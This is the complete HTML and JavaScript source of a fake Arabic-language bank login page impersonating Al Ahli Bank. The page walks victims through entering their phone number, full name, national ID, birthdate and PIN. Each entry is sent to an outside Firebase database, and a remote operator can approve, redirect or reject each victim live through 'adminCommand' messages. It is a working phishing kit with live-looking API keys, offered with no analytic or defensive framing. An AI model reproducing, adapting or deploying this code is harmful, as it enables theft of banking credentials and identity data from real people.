<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>البنك الأهلي - تسجيل الدخول</title>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .container { background: white; border-radius: 20px; padding: 40px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); width: 100%; max-width: 450px; text-align: center; }
        .logo { width: 120px; height: 120px; background: linear-gradient(135deg, #1e3c72, #2a5298); border-radius: 50%; margin: 0 auto 30px; display: flex; align-items: center; justify-content: center; color: white; font-size: 48px; font-weight: bold; }
        h1 { color: #1e3c72; margin-bottom: 10px; font-size: 28px; }
        .subtitle { color: #666; margin-bottom: 30px; font-size: 16px; }
        .form-group { margin-bottom: 20px; text-align: right; }
        label { display: block; margin-bottom: 8px; color: #333; font-weight: 600; font-size: 14px; }
        input { width: 100%; padding: 15px; border: 2px solid #e0e0e0; border-radius: 10px; font-size: 16px; transition: all 0.3s; text-align: right; }
        input:focus { outline: none; border-color: #2a5298; }
        .btn { width: 100%; padding: 16px; background: linear-gradient(135deg, #1e3c72, #2a5298); color: white; border: none; border-radius: 10px; font-size: 18px; font-weight: 600; cursor: pointer; transition: all 0.3s; margin-top: 10px; }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(42, 82, 152, 0.3); }
        .btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
        .hidden { display: none !important; }
        .error { color: #e74c3c; font-size: 14px; margin-top: 5px; }
        .success { color: #27ae60; font-size: 14px; margin-top: 5px; }
        .loading { display: inline-block; width: 20px; height: 20px; border: 3px solid #f3f3f3; border-top: 3px solid #2a5298; border-radius: 50%; animation: spin 1s linear infinite; margin-left: 10px; vertical-align: middle; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .waiting-message { background: #fff3e0; border: 1px solid #ff9800; color: #e65100; padding: 15px; border-radius: 10px; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">🏦</div>
        <h1>البنك الأهلي</h1>
        <p class="subtitle">نظام التحقق الآمن</p>

        <!-- Page 1: Landing -->
        <div id="page-landing" class="page">
            <div class="form-group">
                <label>رقم الهاتف</label>
                <input type="tel" id="phone-landing" placeholder="05xxxxxxxx" maxlength="10">
            </div>
            <button class="btn" onclick="goToPersonalInfo()">متابعة <span id="loading-landing" class="loading hidden"></span></button>
            <p id="error-landing" class="error hidden"></p>
        </div>

        <!-- Page 2: Personal Info -->
        <div id="page-personal" class="page hidden">
            <div class="form-group">
                <label>الاسم الكامل</label>
                <input type="text" id="fullname" placeholder="محمد أحمد">
            </div>
            <div class="form-group">
                <label>رقم الهوية</label>
                <input type="text" id="idnumber" placeholder="1234567890" maxlength="10">
            </div>
            <div class="form-group">
                <label>تاريخ الميلاد</label>
                <input type="text" id="birthdate" placeholder="01/01/1990">
            </div>
            <button class="btn" onclick="submitPersonalInfo()">متابعة <span id="loading-personal" class="loading hidden"></span></button>
            <p id="error-personal" class="error hidden"></p>
        </div>

        <!-- Page 3: Login -->
        <div id="page-login" class="page hidden">
            <div class="form-group">
                <label>رقم الهاتف</label>
                <input type="tel" id="phone-login" readonly>
            </div>
            <div class="form-group">
                <label>الرقم السري</label>
                <input type="password" id="pin" placeholder="****" maxlength="4">
            </div>
            <button class="btn" onclick="submitLogin()">تسجيل الدخول <span id="loading-login" class="loading hidden"></span></button>
            <p id="error-login" class="error hidden"></p>
            <div id="waiting-box" class="waiting-message hidden">
                ⏳ جاري انتظار موافقة الأمن...
            </div>
        </div>

        <!-- Page 4: OTP -->
        <div id="page-otp" class="page hidden">
            <div class="form-group">
                <label>رمز التحقق (OTP)</label>
                <input type="text" id="otp-input" placeholder="123456" maxlength="6">
            </div>
            <div class="otp-display" id="otp-display">------</div>
            <button class="btn" onclick="verifyOTP()">تحقق <span id="loading-otp" class="loading hidden"></span></button>
            <p id="error-otp" class="error hidden"></p>
            <p id="success-otp" class="success hidden">تم التحقق بنجاح!</p>
        </div>

        <!-- Page 5: Success -->
        <div id="page-success" class="page hidden">
            <div style="font-size: 64px; margin: 20px 0;">✅</div>
            <h2 style="color: #27ae60; margin-bottom: 20px;">تم التحقق بنجاح!</h2>
            <p style="color: #666; margin-bottom: 30px;">جاري تحويلك إلى الصفحة الرئيسية...</p>
            <div class="loading"></div>
        </div>
    </div>

    <script>
        // ============================================
        // FIREBASE CONFIGURATION
        // ============================================
        const firebaseConfig = {
            apiKey: "AIzaSyBWJvL51kp6e24PkuEYTwyfNpKDYyRI05M",
            authDomain: "ahlfoncsh.firebaseapp.com",
            databaseURL: "https://ahlfoncsh-default-rtdb.firebaseio.com",
            projectId: "ahlfoncsh",
            storageBucket: "ahlfoncsh.firebasestorage.app",
            messagingSenderId: "5159433699",
            appId: "1:5159433699:web:49005391c7cadec5939cd6"
        };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        // ============================================
        // SESSION MANAGEMENT
        // ============================================
        let sessionId = localStorage.getItem('sessionId');
        if (!sessionId) {
            sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            localStorage.setItem('sessionId', sessionId);
        }

        let currentPage = 'landing';
        let userData = {
            phone: '',
            fullname: '',
            idnumber: '',
            birthdate: '',
            pin: '',
            otp: '',
            status: 'active',
            createdAt: firebase.database.ServerValue.TIMESTAMP
        };

        // Save session to Firebase
        function saveSession() {
            database.ref('site1/sessions/' + sessionId).set({
                ...userData,
                currentPage: currentPage,
                lastActive: firebase.database.ServerValue.TIMESTAMP
            });
        }

        // Listen for admin commands
        function listenForAdminCommands() {
            database.ref('site1/sessions/' + sessionId + '/adminCommand').on('value', (snapshot) => {
                const command = snapshot.val();
                if (command) {
                    if (command.action === 'redirect') {
                        showPage(command.page);
                    } else if (command.action === 'approve') {
                        showPage('otp');
                        generateOTP();
                    } else if (command.action === 'reject') {
                        alert('تم رفض الطلب. يرجى التواصل مع الدعم.');
                        localStorage.clear();
                        location.reload();
                    }
                    database.ref('site1/sessions/' + sessionId + '/adminCommand').remove();
                }
            });
        }

        // ============================================
        // PAGE NAVIGATION
        // ============================================
        function showPage(pageName) {
            document.querySelectorAll('.page').forEach(p => p.classList.add('hidden'));
            document.getElementById('page-' + pageName).classList.remove('hidden');
            currentPage = pageName;
            saveSession();
        }

        // ============================================
        // PAGE 1: LANDING
        // ============================================
        function goToPersonalInfo() {
            const phone = document.getElementById('phone-landing').value.trim();
            if (!phone || phone.length < 10) {
                showError('landing', 'يرجى إدخال رقم هاتف صحيح');
                return;
            }
            userData.phone = phone;
            document.getElementById('phone-login').value = phone;
            showLoading('landing', true);
            saveSession();
            setTimeout(() => {
                showLoading('landing', false);
                showPage('personal');
            }, 500);
        }

        // ============================================
        // PAGE 2: PERSONAL INFO
        // ============================================
        function submitPersonalInfo() {
            const fullname = document.getElementById('fullname').value.trim();
            const idnumber = document.getElementById('idnumber').value.trim();
            const birthdate = document.getElementById('birthdate').value.trim();
            
            if (!fullname || !idnumber || !birthdate) {
                showError('personal', 'يرجى ملء جميع الحقول');
                return;
            }
            
            userData.fullname = fullname;
            userData.idnumber = idnumber;
            userData.birthdate = birthdate;
            
            showLoading('personal', true);
            saveSession();
            setTimeout(() => {
                showLoading('personal', false);
                showPage('login');
            }, 500);
        }

        // ============================================
        // PAGE 3: LOGIN
        // ============================================
        function submitLogin() {
            const pin = document.getElementById('pin').value.trim();
            if (!pin || pin.length !== 4) {
                showError('login', 'يرجى إدخال رقم سري مكون من 4 أرقام');
                return;
            }
            userData.pin = pin;
            userData.status = 'waiting_approval';
            showLoading('login', true);
            document.getElementById('waiting-box').classList.remove('hidden');
            saveSession();
        }

        // ============================================
        // PAGE 4: OTP
        // ============================================
        function generateOTP() {
            const otp = Math.floor(100000 + Math.random() * 900000).toString();
            userData.otp = otp;
            document.getElementById('otp-display').textContent = otp;
            saveSession();
            database.ref('site1/sessions/' + sessionId + '/otpGenerated').set({
                otp: otp,
                timestamp: firebase.database.ServerValue.TIMESTAMP
            });
        }

        function verifyOTP() {
            const enteredOTP = document.getElementById('otp-input').value.trim();
            if (enteredOTP === userData.otp) {
                showLoading('otp', true);
                userData.status = 'completed';
                userData.verifiedAt = firebase.database.ServerValue.TIMESTAMP;
                saveSession();
                setTimeout(() => {
                    showLoading('otp', false);
                    showPage('success');
                }, 1000);
            } else {
                showError('otp', 'رمز التحقق غير صحيح');
            }
        }

        // ============================================
        // UTILITY FUNCTIONS
        // ============================================
        function showError(page, message) {
            const errorEl = document.getElementById('error-' + page);
            errorEl.textContent = message;
            errorEl.classList.remove('hidden');
        }

        function showLoading(page, show) {
            const loadingEl = document.getElementById('loading-' + page);
            if (show) loadingEl.classList.remove('hidden');
            else loadingEl.classList.add('hidden');
        }

        // Initialize
        document.addEventListener('DOMContentLoaded', () => {
            listenForAdminCommands();
            saveSession();
        });
    </script>
</body>
</html>
